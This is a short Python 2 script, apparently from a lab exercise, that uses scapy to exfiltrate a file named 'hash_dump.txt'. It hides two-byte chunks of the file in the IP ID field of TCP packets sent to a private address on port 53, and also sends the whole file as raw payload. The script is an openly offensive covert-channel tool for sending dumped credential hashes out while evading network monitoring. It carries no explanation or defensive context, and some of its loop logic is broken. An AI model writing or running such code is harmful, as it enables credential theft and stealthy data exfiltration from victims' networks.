import sys
from scapy.all import *
from struct import unpack
def sender():
    with open('hash_dump.txt') as f:
        s=f.read()
    #print type(s)
    #print s
   
    payload = list(s)
   # print payload[:2]
   #payload = "Hello!"
   #for i in range(0,len(payload)):
        #st=payload[i]+payload[i+1]
        #id1=unpack("<H",st)[0]
        #pkt=IP(dst="192.168.188.129", id=id1)/TCP(sport=444, dport=53)/Raw(s)
        #if(i<len(payload)-1):
        #    i = i+2
        #send(pkt)
    print len(payload)
    for i in range(0,len(payload)):
        if i%2==0:
            id_payload = payload[i]+payload[i+1]
	    i = i + 2
	    id1 = unpack("<H",id_payload)[0]
	    pkt = IP(dst="192.168.188.129", id = id1)/ TCP (sport=444, dport=53)/ Raw(s)
	    send(pkt)
            print id_payload
sender()
